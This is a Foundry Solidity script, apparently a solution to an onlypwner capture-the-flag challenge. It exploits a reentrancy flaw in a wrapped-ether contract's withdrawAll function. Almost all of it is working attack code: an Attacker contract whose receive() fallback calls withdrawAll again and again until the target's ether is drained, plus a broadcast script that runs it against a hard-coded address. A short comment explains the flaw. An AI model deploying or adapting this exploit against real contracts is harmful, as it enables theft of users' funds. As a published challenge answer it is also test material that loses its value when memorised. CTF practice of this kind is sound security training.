pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IWrappedEther {
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Deposit(address indexed from, uint256 amount);
    event Withdraw(address indexed to, uint256 amount);

    function deposit(address to) external payable;

    function withdraw(uint256 amount) external;

    function withdrawAll() external;

    function transfer(address to, uint256 amount) external;

    function transferFrom(address from, address to, uint256 amount) external;

    function approve(address spender, uint256 amount) external;

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);
}

// https://onlypwner.xyz/challenges/12
/*
standard balanceOf and allowance mapping, deposit and withdraw function.
no recevie() fallback, but not sure how that helps
to drain funds we need to drain eth , look out for sendEth function. used in deposit, withdraw and withdrawall function.
hack : in withdrawall, mapping is updated after sendEth, we can perform reentrancy attack here using an attacker contract that call the withdrawall function in fallback and again till it drains out the ether from this contract.
goal is to drain the weth contract, no need to transfer stolen ether into attacker contract
*/

contract Attacker {
    IWrappedEther public wrappedEther;

    constructor(IWrappedEther _wrappedEther) {
        wrappedEther = _wrappedEther;
    }

    function attack() external payable {
        wrappedEther.deposit{value: msg.value}(address(this));
        wrappedEther.withdrawAll();
    }

    receive() external payable {
        if (address(wrappedEther).balance > 0) {
            wrappedEther.withdrawAll();
        }
    }
}

contract WrappedEther is Script {
    function run() public {
        vm.startBroadcast();
        IWrappedEther weth = IWrappedEther(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
        Attacker attacker = new Attacker(weth);
        attacker.attack{value: 1 ether}();
        vm.stopBroadcast();
    }
}
